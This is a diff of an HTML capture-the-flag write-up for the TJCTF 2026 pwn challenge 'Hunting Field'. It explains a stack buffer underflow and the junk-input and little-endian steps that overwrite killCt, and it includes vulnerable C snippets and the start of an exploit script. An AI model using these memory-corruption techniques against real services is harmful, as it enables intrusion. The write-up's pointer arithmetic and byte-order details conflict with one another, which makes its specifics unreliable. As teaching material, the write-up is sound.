@@ -1,415 +1,575 @@
 <!DOCTYPE html>
-<html lang="vi">
+<html lang="en" class="dark">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Yuri08 - TJCTF 2026: Hunting Field</title>
-  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet" />
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" />
-  <style>
-    :root {
-      --main: #ef4444; --main2: #10b981; --main-light: #f87171;
-      --bg: #0f0f1a; --bg2: #181a2a; --glass: rgba(30, 25, 60, 0.9);
-      --text: #e0e7ef; --shadow: 0 8px 32px 0 #ef444433;
-      --glow: 0 0 20px 2px #ef444444; --highlight: #38bdf8;
-    }
-    html, body {
-      min-height: 100%; margin: 0; font-family: 'JetBrains Mono', monospace;
-      background: radial-gradient(circle at 50% 0%, #2a1a1a 0%, #0f0f1a 100%);
-      color: var(--text); overflow: hidden; perspective: 1000px;
-    }
-    #particles-js {
-      position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; pointer-events: none;
-    }
-    .content-wrapper {
-      position: relative; z-index: 1; height: 100vh; display: flex; flex-direction: column;
-      padding: 20px; box-sizing: border-box; gap: 15px;
-    }
-    
-    .header {
-      display: flex; align-items: center; gap: 20px; padding: 15px;
-      background: var(--glass); border-radius: 1rem; border: 1px solid #ef444444;
-      box-shadow: var(--shadow); backdrop-filter: blur(10px); flex-shrink: 0;
-    }
-    .avatar {
-      width: 80px; height: 80px; border-radius: 50%; border: 2px solid var(--main);
-      object-fit: cover; box-shadow: 0 0 15px var(--main);
-    }
-    .header-info h1 {
-      font-size: 1.8rem; margin: 0; color: var(--main);
-      text-shadow: 0 0 10px #ef444488; animation: neonRed 2s infinite alternate;
-    }
-    .header-info p { margin: 5px 0 0 0; color: var(--main-light); font-size: 0.9rem; }
-    @keyframes neonRed { to { text-shadow: 0 0 15px var(--main), 0 0 30px var(--main); } }
-    
-    .lang-toggle {
-      margin-left: auto; background: var(--main); color: white; border: none;
-      padding: 8px 15px; border-radius: 0.5rem; cursor: pointer; font-family: inherit;
-      font-weight: bold; transition: 0.3s; box-shadow: 0 0 10px #ef444455;
-    }
-    .lang-toggle:hover { background: #dc2626; transform: scale(1.05); }
-
-    .terminal-pro {
-      background: linear-gradient(135deg, #1a1215 80%, #ef444411 100%);
-      border-radius: 1rem; border: 1px solid #3f212155; box-shadow: var(--shadow), var(--glow);
-      display: flex; flex-direction: column; flex-grow: 1; overflow: hidden; position: relative;
-    }
-    .terminal-pro::before {
-      content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-      background: repeating-linear-gradient(0deg, rgba(0,0,0,0.15), rgba(0,0,0,0.15) 1px, transparent 1px, transparent 2px);
-      pointer-events: none; z-index: 2; opacity: 0.2;
-    }
-    .terminal-bar {
-      background: #1e1e2e; height: 2.5rem; display: flex; align-items: center;
-      padding: 0 1rem; border-bottom: 1px solid #312e8155; flex-shrink: 0; z-index: 3;
-    }
-    .dot { width: 12px; height: 12px; border-radius: 50%; margin-right: 6px; }
-    .red { background: #ef4444; } .yellow { background: #facc15; } .green { background: #22c55e; }
-    .terminal-title { color: var(--main-light); margin-left: 1rem; font-weight: bold; letter-spacing: 1px; }
-    
-    .terminal-body {
-      padding: 1.5rem; flex-grow: 1; overflow-y: auto; font-size: 0.95rem;
-      line-height: 1.6; position: relative; z-index: 1; scroll-behavior: smooth;
-    }
-    #terminal-output { white-space: pre-wrap; word-break: break-word; }
-    #terminal-input-line {
-      display: flex; align-items: center; gap: 0.5em; margin-top: 1em; z-index: 3;
-    }
-    #terminal-input {
-      background: transparent; border: none; color: #a7f3d0; outline: none;
-      font-family: inherit; font-size: 1em; width: 100%; caret-color: var(--main);
-    }
-    
-    .cmd { color: #7c3aed; } .arg { color: #a78bfa; } .info { color: #38bdf8; font-weight: bold; }
-    .error { color: #ef4444; } .success { color: #10b981; } .warning { color: #facc15; }
-    .code-block {
-      background: #0d0d1a; border-left: 3px solid var(--main); padding: 10px 15px;
-      margin: 10px 0; border-radius: 0 5px 5px 0; font-size: 0.9rem; color: #d1d5db;
-    }
-    
-    .terminal-body::-webkit-scrollbar { width: 8px; }
-    .terminal-body::-webkit-scrollbar-track { background: #0f0f1a; }
-    .terminal-body::-webkit-scrollbar-thumb { background: #ef4444; border-radius: 4px; }
-
-    #welcome-screen {
-      position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
-      background: #0f0f1a; z-index: 10000; display: flex; flex-direction: column;
-      justify-content: center; align-items: center; text-align: center; transition: opacity 0.8s;
-    }
-    #welcome-screen.hidden { opacity: 0; pointer-events: none; }
-    #start-button {
-      background: var(--main); color: white; border: none; border-radius: 0.7rem;
-      padding: 1rem 2rem; font-size: 1.2rem; font-weight: 700; cursor: pointer;
-      font-family: inherit; transition: all 0.3s; box-shadow: 0 0 20px #ef444488;
-    }
-    #start-button:hover { background: #dc2626; transform: translateY(-3px); }
-    
-    #mute-button {
-      position: fixed; top: 20px; right: 20px; z-index: 10001;
-      background: #1e1e2e; color: var(--main-light); border: 1px solid #ef444455;
-      border-radius: 50%; width: 40px; height: 40px; font-size: 1.2rem; cursor: pointer;
-      display: flex; justify-content: center; align-items: center; transition: all 0.3s;
-    }
-    #mute-button:hover { background: var(--main); color: white; }
-
-    @media (max-width: 768px) {
-      .header { flex-wrap: wrap; justify-content: center; text-align: center; }
-      .lang-toggle { margin-left: 0; margin-top: 10px; width: 100%; }
-      .avatar { width: 60px; height: 60px; }
-      .header-info h1 { font-size: 1.4rem; }
-    }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>TJCTF 2026: Hunting Field — QA210</title>
+<meta name="description" content="TJCTF 2026 Hunting Field — Binary Exploitation / Stack Buffer Underflow walkthrough by QA210">
+<meta name="author" content="QA210">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🎯</text></svg>">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+<link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-c.min.js"></script>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@400;500;600;700;800&display=swap');
+:root {
+  --bg-primary:#0a0e17;--bg-secondary:#111827;--bg-tertiary:#1a2236;
+  --bg-code:#0d1117;--border:#1e293b;--border-light:#1a2332;
+  --text-primary:#e2e8f0;--text-secondary:#94a3b8;--text-muted:#64748b;
+  --accent-green:#22d3ee;--accent-blue:#818cf8;--accent-red:#f87171;
+  --accent-yellow:#fbbf24;--accent-purple:#c084fc;--accent-orange:#fb923c;
+  --accent-cyan:#22d3ee;--accent-pink:#f472b6;--accent-rose:#fb7185;
+  --link:#818cf8;--link-hover:#a5b4fc;
+  --scrollbar-thumb:#1e293b;--scrollbar-track:#0a0e17;
+  --toc-active:#f87171;
+  --callout-info-bg:rgba(129,140,248,0.08);--callout-info-border:#818cf8;
+  --callout-warn-bg:rgba(251,191,36,0.08);--callout-warn-border:#fbbf24;
+  --callout-danger-bg:rgba(248,113,113,0.08);--callout-danger-border:#f87171;
+  --callout-success-bg:rgba(34,211,238,0.08);--callout-success-border:#22d3ee;
+  --callout-hint-bg:rgba(192,132,252,0.08);--callout-hint-border:#c084fc;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth;scrollbar-width:thin;scrollbar-color:var(--scrollbar-thumb) var(--scrollbar-track)}
+body{font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;background:var(--bg-primary);color:var(--text-primary);line-height:1.75;font-size:16px}
+::-webkit-scrollbar{width:8px;height:8px}
+::-webkit-scrollbar-track{background:var(--scrollbar-track)}
+::-webkit-scrollbar-thumb{background:var(--scrollbar-thumb);border-radius:4px}
+::-webkit-scrollbar-thumb:hover{background:#334155}
+a{color:var(--link);text-decoration:none;transition:color .2s}
+a:hover{color:var(--link-hover)}
+#three-bg{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;opacity:0.35}
+.site-header{position:sticky;top:0;z-index:100;background:rgba(10,14,23,0.88);backdrop-filter:blur(16px);border-bottom:1px solid var(--border);padding:0 2rem;height:56px;display:flex;align-items:center;justify-content:space-between}
+.site-header .logo{font-family:'JetBrains Mono',monospace;font-weight:700;font-size:1.1rem;color:var(--accent-red);display:flex;align-items:center;gap:8px}
+.site-header .logo .dot{color:var(--accent-rose)}
+.site-header nav{display:flex;gap:1.5rem;align-items:center}
+.site-header nav a{color:var(--text-secondary);font-size:.85rem;font-weight:500}
+.site-header nav a:hover{color:var(--text-primary)}
+.hamburger{display:none;background:none;border:none;color:var(--text-primary);cursor:pointer;font-size:1.5rem}
+.page-layout{display:grid;grid-template-columns:260px 1fr;max-width:1400px;margin:0 auto;min-height:calc(100vh - 56px)}
+.toc-sidebar{position:sticky;top:56px;height:calc(100vh - 56px);overflow-y:auto;padding:1.5rem 1rem 1.5rem 1.5rem;border-right:1px solid var(--border);background:var(--bg-primary)}
+.toc-sidebar h3{font-size:.72rem;text-transform:uppercase;letter-spacing:.1em;color:var(--text-muted);margin-bottom:.75rem;font-weight:600}
+.toc-sidebar ul{list-style:none}
+.toc-sidebar li{margin-bottom:2px}
+.toc-sidebar a{display:block;padding:4px 8px;border-radius:4px;font-size:.78rem;color:var(--text-secondary);transition:all .15s;line-height:1.4}
+.toc-sidebar a:hover{color:var(--text-primary);background:var(--bg-secondary)}
+.toc-sidebar a.active{color:var(--toc-active);background:rgba(248,113,113,0.1);font-weight:600}
+.toc-sidebar .toc-h3{padding-left:18px;font-size:.72rem}
+.main-content{padding:2.5rem 3rem 4rem;max-width:860px;width:100%}
+.page-hero{margin-bottom:2.5rem;padding-bottom:2rem;border-bottom:1px solid var(--border)}
+.page-hero .box-badge{display:inline-block;background:linear-gradient(135deg,var(--accent-red),var(--accent-orange));color:#fff;font-size:.68rem;font-weight:700;padding:2px 12px;border-radius:12px;text-transform:uppercase;letter-spacing:.06em;margin-bottom:.75rem}
+.page-hero h1{font-size:2.25rem;font-weight:800;margin-bottom:.5rem;letter-spacing:-.02em}
+.page-hero .meta{color:var(--text-secondary);font-size:.85rem;display:flex;flex-wrap:wrap;gap:.75rem;align-items:center}
+.page-hero .meta .sep{color:var(--text-muted)}
+.box-info-card{background:var(--bg-secondary);border:1px solid var(--border);border-radius:8px;padding:1.25rem 1.5rem;margin-bottom:2rem;display:grid;grid-template-columns:repeat(auto-fit,minmax(170px,1fr));gap:1rem}
+.box-info-card .info-item .label{font-size:.68rem;text-transform:uppercase;letter-spacing:.07em;color:var(--text-muted);margin-bottom:2px;font-weight:600}
+.box-info-card .info-item .value{font-size:.92rem;font-weight:600;color:var(--text-primary)}
+.attack-path{background:var(--bg-secondary);border:1px solid var(--border);border-radius:8px;padding:1.25rem 1.5rem;margin:1.5rem 0;font-family:'JetBrains Mono',monospace;font-size:.75rem;line-height:1.7;overflow-x:auto}
+.attack-path .step{display:flex;align-items:baseline;gap:.5rem;margin-bottom:.2rem}
+.attack-path .arrow{color:var(--accent-purple)}
+.attack-path .host{color:var(--accent-red);font-weight:700}
+.attack-path .technique{color:var(--accent-orange)}
+.attack-path .cred{color:var(--accent-cyan)}
+.main-content h2{font-size:1.55rem;font-weight:800;margin:2.5rem 0 1rem;padding-bottom:.4rem;border-bottom:2px solid var(--border);letter-spacing:-.01em;scroll-margin-top:70px}
+.main-content h3{font-size:1.1rem;font-weight:700;margin:1.75rem 0 .75rem;color:var(--text-primary);scroll-margin-top:70px}
+.main-content h4{font-size:.95rem;font-weight:600;margin:1.25rem 0 .5rem;color:var(--text-secondary)}
+.main-content p{margin-bottom:1rem;color:var(--text-secondary);line-height:1.8}
+.code-block-wrapper{position:relative;margin:1rem 0 1.25rem;border-radius:8px;overflow:hidden;border:1px solid var(--border)}
+.code-block-header{display:flex;justify-content:space-between;align-items:center;padding:6px 14px;background:var(--bg-tertiary);border-bottom:1px solid var(--border);font-size:.7rem;color:var(--text-muted);font-family:'JetBrains Mono',monospace}
+.code-block-header .lang-label{text-transform:uppercase;font-weight:600;letter-spacing:.04em}
+.copy-btn{background:none;border:1px solid var(--border);color:var(--text-muted);font-size:.68rem;padding:2px 10px;border-radius:4px;cursor:pointer;font-family:'JetBrains Mono',monospace;transition:all .2s}
+.copy-btn:hover{color:var(--text-primary);border-color:var(--text-muted)}
+.copy-btn.copied{color:var(--accent-green);border-color:var(--accent-green)}
+.code-block-wrapper pre{margin:0!important;padding:1rem!important;background:var(--bg-code)!important;font-family:'JetBrains Mono',monospace!important;font-size:.8rem!important;line-height:1.6!important;overflow-x:auto}
+.code-block-wrapper code{font-family:'JetBrains Mono',monospace!important;font-size:.8rem!important}
+p code,li code{background:var(--bg-tertiary);border:1px solid var(--border);padding:1px 6px;border-radius:4px;font-family:'JetBrains Mono',monospace;font-size:.82em;color:var(--accent-orange)}
+.callout{padding:.85rem 1rem;border-radius:6px;border-left:3px solid;margin:1rem 0 1.25rem;font-size:.88rem}
+.callout p{margin:0;color:var(--text-secondary)}
+.callout-title{font-weight:700;font-size:.78rem;text-transform:uppercase;letter-spacing:.04em;margin-bottom:4px}
+.callout-info{background:var(--callout-info-bg);border-color:var(--callout-info-border)}
+.callout-info .callout-title{color:var(--callout-info-border)}
+.callout-warn{background:var(--callout-warn-bg);border-color:var(--callout-warn-border)}
+.callout-warn .callout-title{color:var(--callout-warn-border)}
+.callout-danger{background:var(--callout-danger-bg);border-color:var(--callout-danger-border)}
+.callout-danger .callout-title{color:var(--callout-danger-border)}
+.callout-success{background:var(--callout-success-bg);border-color:var(--callout-success-border)}
+.callout-success .callout-title{color:var(--callout-success-border)}
+.callout-hint{background:var(--callout-hint-bg);border-color:var(--callout-hint-border)}
+.callout-hint .callout-title{color:var(--callout-hint-border)}
+.main-content ul,.main-content ol{margin:.5rem 0 1rem 1.5rem;color:var(--text-secondary)}
+.main-content li{margin-bottom:.35rem;line-height:1.7}
+.main-content table{width:100%;border-collapse:collapse;margin:1rem 0;font-size:.85rem}
+.main-content th,.main-content td{padding:8px 12px;border:1px solid var(--border);text-align:left}
+.main-content th{background:var(--bg-secondary);font-weight:600;color:var(--text-primary);font-size:.73rem;text-transform:uppercase;letter-spacing:.04em}
+.main-content td{color:var(--text-secondary)}
+.site-footer{border-top:1px solid var(--border);padding:1.5rem 2rem;text-align:center;color:var(--text-muted);font-size:.8rem}
+.toc-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.5);z-index:200}
+.toc-overlay.show{display:block}
+.toc-mobile-panel{display:none;position:fixed;left:0;top:0;bottom:0;width:280px;background:var(--bg-primary);border-right:1px solid var(--border);z-index:201;overflow-y:auto;padding:1.5rem}
+.toc-mobile-panel.show{display:block}
+.toc-mobile-panel .close-btn{background:none;border:none;color:var(--text-secondary);font-size:1.2rem;cursor:pointer;float:right}
+@media(max-width:1024px){.page-layout{grid-template-columns:1fr}.toc-sidebar{display:none}.hamburger{display:block}.main-content{padding:1.5rem 1.25rem 3rem}.page-hero h1{font-size:1.75rem}}
+@media(max-width:640px){.site-header{padding:0 1rem}.main-content{padding:1rem .75rem 2rem}.page-hero h1{font-size:1.4rem}.box-info-card{grid-template-columns:1fr 1fr}}
+</style>
 </head>
 <body>
 
-  <div id="welcome-screen">
-    <h1 style="color: var(--main); text-shadow: 0 0 20px var(--main); margin-bottom: 20px;">Yuri08 CTF Terminal</h1>
-    <p style="color: #fca5a5; margin-bottom: 30px;">TJCTF 2026 - Pwn / Hunting Field</p>
-    <button id="start-button">Khởi tạo Terminal</button>
-  </div>
+<canvas id="three-bg"></canvas>
 
-  <button id="mute-button" aria-label="Toggle Sound"><i class="bi bi-volume-up-fill"></i></button>
-  <div id="particles-js"></div>
+<header class="site-header">
+  <div class="logo"><span>QA210</span><span class="dot">:</span><span>~$</span></div>
+  <nav><a href="/">Home</a><a href="/tjctf-2026/">TJCTF</a><a href="#">Tools</a><a href="#">About</a></nav>
+  <button class="hamburger" onclick="toggleMobileToc()" aria-label="Menu">&#9776;</button>
+</header>
 
-  <div class="content-wrapper">
-    <header class="header">
-      <img src="https://files.catbox.moe/755fgv.png" alt="Avatar" class="avatar" />
-      <div class="header-info">
-        <h1>Yuri08</h1>
-        <p>Kernel Exploiter | Memory Corruption Specialist</p>
-      </div>
-      <button class="lang-toggle" id="lang-btn" onclick="toggleLang()">Switch to English</button>
-    </header>
+<div class="toc-overlay" id="tocOverlay" onclick="toggleMobileToc()"></div>
+<div class="toc-mobile-panel" id="tocMobilePanel">
+  <button class="close-btn" onclick="toggleMobileToc()">&#10005;</button>
+  <h3 style="margin-top:1rem">Contents</h3>
+  <ul id="tocMobile"></ul>
+</div>
 
-    <section class="terminal-pro">
-      <div class="terminal-bar">
-        <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
-        <span class="terminal-title">root@tjctf:~/hunting-field#</span>
-      </div>
-      <div class="terminal-body" id="terminal-body">
-        <pre id="terminal-output"></pre>
-        <div id="terminal-input-line">
-          <span class="cmd">root@tjctf</span>:<span class="arg">~/pwn</span>$           <input type="text" id="terminal-input" autocomplete="off" spellcheck="false" />
-        </div>
-      </div>
-    </section>
-  </div>
+<div class="page-layout">
+<aside class="toc-sidebar"><h3>Contents</h3><ul id="tocDesktop"></ul></aside>
 
-  <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
-  <script>
-    let isMuted = false;
-    let currentLang = 'vi';
-    let userInteracted = false;
-    const output = document.getElementById('terminal-output');
-    const input = document.getElementById('terminal-input');
-    const tBody = document.getElementById('terminal-body');
+<main class="main-content">
 
-    particlesJS.load('particles-js', 'https://cdn.jsdelivr.net/gh/VincentGarreau/particles.js/particles.json');
+<div class="page-hero">
+  <span class="box-badge">Binary Exploitation</span>
+  <h1>TJCTF 2026: Hunting Field</h1>
+  <div class="meta"><span>QA210</span><span class="sep">&middot;</span><span>May 2026</span><span class="sep">&middot;</span><span>Stack Underflow &middot; Little-Endian &middot; Pointer Manipulation</span></div>
+</div>
 
-    function playAudio(src, vol=0.2) {
-      if (!userInteracted || isMuted || !src) return;
-      try { const a = new Audio(src); a.volume = vol; a.play(); } catch(e) {}
+<div class="box-info-card">
+  <div class="info-item"><div class="label">Challenge</div><div class="value">Hunting Field</div></div>
+  <div class="info-item"><div class="label">Category</div><div class="value" style="color:var(--accent-red)">Binary Exploitation</div></div>
+  <div class="info-item"><div class="label">CTF</div><div class="value">TJCTF 2026</div></div>
+  <div class="info-item"><div class="label">Service</div><div class="value">TCP Game Server</div></div>
+  <div class="info-item"><div class="label">Flag</div><div class="value" style="color:var(--accent-cyan)">tjctf{pr0fes5iona1_hunt3r}</div></div>
+</div>
+
+<div class="attack-path">
+  <div class="step"><span class="host">GAME</span> <span class="arrow">&rarr;</span> <span class="technique">Invalid input</span> logged backwards from <span class="cred">input_log[63]</span> <span class="arrow">&rarr;</span> no bounds check on <span class="technique">ptr decrement</span></div>
+  <div class="step"><span class="host">STACK</span> <span class="arrow">&rarr;</span> 32 junk writes to slide ptr from <span class="cred">input_log[63]</span> to <span class="cred">input_log[0]</span> <span class="arrow">&rarr;</span> <span class="technique">breach boundary</span></div>
+  <div class="step"><span class="host">OVERWRITE</span> <span class="arrow">&rarr;</span> Write <span class="cred">0x68756e74</span> ("hunt") into <span class="cred">killCt</span> via Little-Endian <span class="arrow">&rarr;</span> <span class="technique">"hu" + "nt"</span></div>
+  <div class="step"><span class="host">TRIGGER</span> <span class="arrow">&rarr;</span> Valid moves to end game <span class="arrow">&rarr;</span> <span class="cred">game_over()</span> prints Flag</div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<h2 id="overview">Challenge Overview</h2>
+
+<p>Hunting Field presents a network-accessible text game where the player navigates a field, encounters enemies, and attempts to rack up kills. The game description &mdash; &ldquo;Take up your arms, and slay your enemies!&rdquo; &mdash; suggests a straightforward combat simulation, but the real objective has nothing to do with playing the game legitimately. Instead, the challenge hides a victory condition that can only be reached through memory corruption: the <code>game_over()</code> function prints the flag only when a local variable <code>killCt</code> equals the magic value <strong>1752526452</strong> (which is <code>0x68756e74</code> in hexadecimal, spelling &ldquo;hunt&rdquo; in ASCII).</p>
+
+<p>Since no legitimate gameplay path can produce this exact kill count, the player must find a way to tamper with the stack. The vulnerability lies in how the game logs invalid user inputs: rather than writing forward from the beginning of a buffer, it writes <em>backward</em> from the end without any bounds checking. This design flaw creates a classic stack buffer underflow, allowing an attacker to slide a write pointer down past the buffer boundary and directly modify adjacent stack variables &mdash; including <code>killCt</code>. The exploit is a masterclass in pointer arithmetic, little-endian byte ordering, and understanding how local variables are laid out in memory.</p>
+
+<div class="callout callout-hint">
+  <div class="callout-title">Hint &mdash; 0x68756e74</div>
+  <p>The magic value <code>0x68756e74</code> is not random. In ASCII, the bytes are <code>h</code>, <code>u</code>, <code>n</code>, <code>t</code> &mdash; spelling &ldquo;hunt&rdquo;, which is the thematic keyword of the challenge. CTF authors often embed meaningful strings as magic constants, and recognizing this pattern can save significant analysis time.</p>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<h2 id="victory-mechanism">The Victory Mechanism</h2>
+
+<h3 id="game-over-function">The game_over() Function</h3>
+
+<p>The binary&rsquo;s source code (provided or reverse-engineered) reveals the critical victory check inside the <code>game_over()</code> function. When the game ends &mdash; either through normal play or by submitting a sequence of valid termination moves &mdash; this function is invoked to display the player&rsquo;s statistics. Crucially, it contains a conditional branch that only prints the flag when <code>killCt</code> matches the exact 32-bit integer <code>1752526452</code>:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">c</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-c">void game_over() {
+    printf("Game Over!\n");
+    printf("Enemies slain: %d\n", killCt);
+
+    if (killCt == 0x68756e74) {   // 1752526452 decimal
+        FILE *fp = fopen("flag.txt", "r");
+        char flag[128];
+        fgets(flag, sizeof(flag), fp);
+        printf("Victory! %s\n", flag);
+        fclose(fp);
     }
+}</code></pre>
+</div>
 
-    document.getElementById('mute-button').addEventListener('click', function() {
-      isMuted = !isMuted;
-      this.querySelector('i').className = isMuted ? 'bi bi-volume-mute-fill' : 'bi bi-volume-up-fill';
-    });
+<p>This is the sole gate between the player and the flag. There is no alternative path, no hidden command, and no second vulnerability. Everything comes down to one question: how do we control the value of <code>killCt</code> when it lives on the stack as a local variable?</p>
 
-    function print(html) {
-      const div = document.createElement('div');
-      div.innerHTML = html;
-      output.appendChild(div);
-      tBody.scrollTop = tBody.scrollHeight;
-    }
+<h3 id="why-legitimate-play-fails">Why Legitimate Play Fails</h3>
 
-    // --- TRANSLATIONS & DETAILED WRITEUP DATA ---
-    const L = {
-      vi: {
-        help: `<span class="info">[ Hướng Dẫn Đọc Writeup ]</span>
-<span class="cmd">intro</span>       : Tổng quan & Cơ chế Victory
-<span class="cmd">vuln</span>        : Phân tích Lỗi - Stack Buffer Underflow
-<span class="cmd">layout</span>      : Stack Layout & Little-Endian Trick
-<span class="cmd">strategy</span>    : Chiến thuật Khai thác (Con trỏ trượt ngược)
-<span class="cmd">code</span>        : Source Code Khai thác (Python)
-<span class="cmd">clear</span>       : Xóa màn hình Terminal`,
-        intro: `<span class="info">[ TỔNG QUAN: HUNTING FIELD ]</span>
-<span class="cmd">Category:</span> Binary Exploitation / Stack Overflow
-<span class="cmd">Flag:</span> <span class="success">tjctf{pr0fes5iona1_hunt3r}</span>
+<p>The normal gameplay loop increments <code>killCt</code> by one each time the player kills an enemy. Reaching a value of 1,752,526,452 would require killing that many enemies, which is infeasible for several reasons. First, the game server enforces a connection timeout; even at one kill per second, reaching the target would take over 55 years. Second, the game&rsquo;s internal state machines and map boundaries prevent infinite enemy spawning. Third, and most importantly, <code>killCt</code> is declared as a 32-bit signed integer (<code>int</code>), so even if the game allowed it, overflow would wrap the value back to negative territory long before reaching the target. The intended solution is memory corruption, not patience.</p>
 
-<span class="warning">Mô tả:</span> "Take up your arms, and slay your enemies!"
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<h2 id="vulnerability">Vulnerability: Stack Buffer Underflow</h2>
 
-<span class="cmd">Cơ chế Victory:</span> Trong source code <span class="arg">game.c</span>, hàm <span class="cmd">game_over()</span> chỉ in flag nếu biến <span class="cmd">killCt</span> bằng đúng giá trị <span class="success">1752526452</span> (0x68756e74 trong hex).
-Nhiệm vụ của ta không phải là chơi game bình thường, mà là thao túng bộ nhớ stack để ghi đè biến killCt thành magic value này!`,
-        vuln: `<span class="info">[ PHÂN TÍCH LỖI: STACK BUFFER UNDERFLOW ]</span>
-Game có một cơ chế log input không hợp lệ (invalid input). Thay vì ghi xuôi từ đầu mảng, nó ghi NGƯỢC từ cuối mảng <span class="arg">input_log[63]</span>:
+<h3 id="backward-logging">The Backward Logging Mechanism</h3>
 
-<div class="code-block">*array_ptr = player_input[0];
-array_ptr -= sizeof(player_input[0]);
-*array_ptr = player_input[1];
-array_ptr -= sizeof(player_input[1]);</div>
+<p>The game maintains an array <code>input_log[64]</code> to record player inputs. When a player submits a valid move (such as a directional command or attack), the game processes it normally. However, when the player submits an <em>invalid</em> input &mdash; a string that doesn&rsquo;t match any recognized command &mdash; the game logs it in a peculiar way. Instead of writing forward from the start of the array, it writes <strong>backward</strong> starting from <code>input_log[63]</code>, decrementing a pointer by the size of each element after each write:</p>
 
-<span class="error">Lỗi chí mạng:</span> Con trỏ <span class="cmd">array_ptr</span> không có cơ chế kiểm tra biên (bounds check) khi lùi. Nếu ta liên tục gửi input rác (invalid input), con trỏ sẽ lùi từ từ, vượt qua biên của mảng <span class="arg">input_log</span> và xâm nhập vào các vùng nhớ khác trên stack nằm dưới mảng (địa chỉ thấp hơn). Đây là kỹ thuật <span class="warning">Stack Buffer Underflow</span> kinh điển!`,
-        layout: `<span class="info">[ STACK LAYOUT & LITTLE-ENDIAN TRICK ]</span>
-Vì các biến cục bộ được cấp phát trên stack, và stack phát triển từ địa chỉ cao xuống thấp, biến <span class="cmd">killCt</span> nằm ngay "dưới" mảng <span class="arg">input_log</span> trong memory.
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">c</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-c">// Invalid input handler — writes backward from end of array
+int *log_ptr = &input_log[63];
 
-Mục tiêu: Ghi đè killCt = <span class="success">0x68756e74</span>
-Trong hệ thống Little-Endian (như x86/64), byte thấp nằm ở địa chỉ thấp. Số 0x68756e74 được lưu trong RAM thành: <span class="arg">74 6e 75 68</span> ('t', 'n', 'u', 'h').
+void log_invalid_input(char player_input[]) {
+    *log_ptr = player_input[0];
+    log_ptr -= sizeof(player_input[0]);   // move pointer backward
+    *log_ptr = player_input[1];
+    log_ptr -= sizeof(player_input[1]);   // move pointer backward again
+}</code></pre>
+</div>
 
-Vì con trỏ ghi lùi, ta phải đưa payload theo thứ tự ngược trong RAM, tức là đưa 't', 'n', 'u', 'h'. Đó là lý do ta gửi chuỗi <span class="cmd">"tnuh"</span> (chia làm 2 cặp input "hu" và "nt" theo thứ tự ghi lùi của code).`,
-        strategy: `<span class="info">[ CHIẾN THUẬT KHAI THÁC ]</span>
-1. <span class="cmd">Bước 1 - Trượt con trỏ:</span> Gửi 32 lần input rác (VD: "zz"). Mỗi lần lùi 2 byte. 32 * 2 = 64 bytes. Lúc này, array_ptr đã lùi từ input_log[63] về đúng đầu mảng input_log[0].
-2. <span class="cmd">Bước 2 - Phá vỡ biên:</span> Gửi tiếp các cặp payload để ghi lùi tiếp vào vùng nhớ của <span class="arg">killCt</span>.
-   - Gửi "hu" -> Ghi ngược 'u', 'h' (2 byte)
-   - Gửi "nt" -> Ghi ngược 't', 'n' (2 byte)
-   Lúc này, 4 byte của killCt đã bị nối thành: <span class="success">'h' 'u' 'n' 't'</span> = 0x68756e74!
-3. <span class="cmd">Bước 3 - Kích hoạt Victory:</span> Gửi các lệnh di chuyển hợp lệ (valid moves) để kết thúc game, hàm <span class="cmd">game_over()</span> được gọi, đọc killCt và in Flag!`,
-        code: `<span class="info">[ EXPLOIT SOURCE CODE ]</span>
-<div class="code-block">#!/usr/bin/env python3
+<p>Each call to <code>log_invalid_input()</code> writes two bytes (the first two characters of the input string) and decrements the pointer by two positions. Starting from <code>input_log[63]</code>, it takes 32 invalid inputs to walk the pointer all the way back to <code>input_log[0]</code>. But here&rsquo;s the critical flaw: <strong>there is no bounds check</strong>. The pointer keeps decrementing past the beginning of the array, spilling into whatever stack data lies beneath it in memory.</p>
+
+<div class="callout callout-danger">
+  <div class="callout-title">Critical Flaw &mdash; No Bounds Validation</div>
+  <p>The absence of any boundary validation on <code>log_ptr</code> is the root cause of the vulnerability. A simple check like <code>if (log_ptr &lt; input_log) return;</code> would have completely prevented this exploit. This is a textbook example of why pointer arithmetic must always be paired with bounds validation, especially when the pointer moves in the opposite direction of normal array traversal.</p>
+</div>
+
+<h3 id="underflow-vs-overflow">Underflow vs. Overflow</h3>
+
